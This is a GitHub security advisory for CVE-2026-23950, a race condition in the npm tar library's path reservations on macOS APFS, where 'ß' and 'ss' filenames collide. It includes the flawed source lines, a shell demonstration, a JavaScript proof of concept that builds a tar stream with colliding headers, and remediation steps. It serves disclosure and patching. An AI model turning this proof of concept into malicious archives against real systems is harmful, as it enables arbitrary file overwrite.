# [H] Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS

## Summary
Severity: High
Advisory: GHSA-r6q2-hw4h-h46w
CVE: CVE-2026-23950
CWE: CWE-176, CWE-367
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L (CVSS_V3)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-r6q2-hw4h-h46w
Type: github-advisory

## Affected
- npm: `tar` — affected >=0 <7.5.4

## Details
**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS

**AUTHOR**: Tomás Illuminati

### Details

A race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.

```typescript
// node-tar/src/path-reservations.ts (Lines 53-62)
reserve(paths: string[], fn: Handler) {
    paths =
      isWindows ?
        ['win32 parallelization disabled']
      : paths.map(p => {
          return stripTrailingSlashes(
            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS
          ).toLowerCase()
        })

```

In MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:

``````bash
bash-3.2$ printf "CONTENT_SS\n" > collision_test_ss
bash-3.2$ ls
collision_test_ss
bash-3.2$ printf "CONTENT_ESSZETT\n" > collision_test_ß
bash-3.2$ ls -la
total 8
drwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .
drwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..
-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss
bash-3.2$ 
``````

---

### PoC

``````javascript
const tar = require('tar');
const fs = require('fs');
const path = require('path');
const { PassThrough } = require('stream');

const exploitDir = path.resolve('race_exploit_dir');
if (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });
fs.mkdirSync(exploitDir);

console.log('[*] Testing...');
console.log(`[*] Extraction target: ${exploitDir}`);

// Construct stream
const stream = new PassThrough();

const contentA = 'A'.repeat(1000);
const contentB = 'B'.repeat(1000);

// Key 1: "f_ss"
const header1 = new tar.Header({
    path: 'collision_ss',
    mode: 0o644,
    size: contentA.length,
});
header1.encode();

// Key 2: "f_ß"
const header2 = new tar.Header({
    path: 'collision_ß',
    mode: 0o644,
    size: contentB.length,
});
header2.encode();

// Write to stream
stream.write(header1.block);
stream.write(contentA);
stream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding

stream.write(header2.block);
stream.write(contentB);
stream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding

// End
stream.write(Buffer.alloc(1024));
stream.end();

// Extract
const extract = new tar.Unpack({
    cwd: exploitDir,
    // Ensure jobs is high enough to allow parallel processing if locks fail
    jobs: 8 
});

stream.pipe(extract);

extract.on('end', () => {
    console.log('[*] Extraction complete');

    // Check what exists
    const files = fs.readdirSync(exploitDir);
    console.log('[*] Files in exploit dir:', files);
    files.forEach(f => {
        const p = path.join(exploitDir, f);
        const stat = fs.statSync(p);
        const content = fs.readFileSync(p, 'utf8');
        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);
    });

    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {
        console.log('\[*] GOOD');
    } else {
        console.log('[-] No collision');
    }
});

``````

---

### Impact
This is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.

---

### Remediation

Update `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.

Users who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.

---

## References
- https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w
- https://nvd.nist.gov/vuln/detail/CVE-2026-23950
- https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6
- https://github.com/isaacs/node-tar
